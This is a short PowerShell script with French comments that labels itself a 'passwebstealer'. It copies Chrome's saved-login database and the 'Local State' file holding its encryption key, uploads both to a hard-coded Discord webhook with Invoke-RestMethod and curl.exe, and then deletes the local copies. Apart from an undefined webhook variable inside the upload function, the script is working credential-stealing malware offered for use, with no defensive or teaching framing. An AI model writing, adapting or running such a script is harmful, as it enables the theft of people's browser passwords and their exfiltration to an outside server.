$webhookUrl = "https://discord.com/api/webhooks/1213792320122523688/lIBOlPzfAcQVLmZIkYbvuxwJeviZWCQIz-CcF4Ep4ENGwwg3BmZgu0x0N68OOR_tZ4Vy"
$message = "Votre message ici"
$randomNumber = Get-Random -Minimum 0 -Maximum 10000
$username = "passwebstealer victim n°$randomNumber"

# Définition de la fonction Upload-Discord
function Upload-Discord {
    [CmdletBinding()]  # Permet de définir des attributs pour le script
    param(
        [parameter(Position=0, Mandatory=$False)] [string] $file,  # Paramètre optionnel pour le chemin du fichier à envoyer
        [parameter(Position=1, Mandatory=$False)] [string] $text   # Paramètre optionnel pour le texte à envoyer
    )

    # Création du corps du message JSON à envoyer au webhook Discord
    $Body = @{
        'username' = $env:username  # Utilise le nom d'utilisateur de l'environnement comme nom d'utilisateur dans le message
        'content'  = $text          # Utilise le texte passé en paramètre comme contenu du message
    }

    # Vérifie si le paramètre $text n'est pas vide ou null
    if (-not [string]::IsNullOrEmpty($text)) {
        # Envoie une requête POST au webhook Discord avec le contenu JSON converti en chaîne JSON
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    # Vérifie si le paramètre $file n'est pas vide ou null
    if (-not [string]::IsNullOrEmpty($file)) {
        # Utilise curl.exe pour envoyer le fichier spécifié au webhook Discord
        curl.exe -F "file1=@$file" $hookurl
    }
}

# Définition des chemins des fichiers à copier
$sourceFile1 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$outputFile1 = "$([System.Environment]::GetFolderPath('Desktop'))\output.txt"

# Copie du premier fichier vers le bureau
Copy-Item $sourceFile1 $outputFile1

# Envoi du fichier copié au webhook Discord avec le texte ":)"
Upload-Discord -file $outputFile1 -text ":)"

# Suppression du fichier copié
Remove-Item $outputFile1

# Définition des chemins des fichiers à copier
$sourceFile2 = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$outputFile2 = "$([System.Environment]::GetFolderPath('Desktop'))\key.txt"

# Copie du deuxième fichier vers le bureau
Copy-Item $sourceFile2 $outputFile2

# Envoi du fichier copié au webhook Discord avec le texte "Key-File"
Upload-Discord -file $outputFile2 -text "Key-File"

# Suppression du fichier copié
Remove-Item $outputFile2


$body = @{
    content = $message
    username = $username
} | ConvertTo-Json

Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'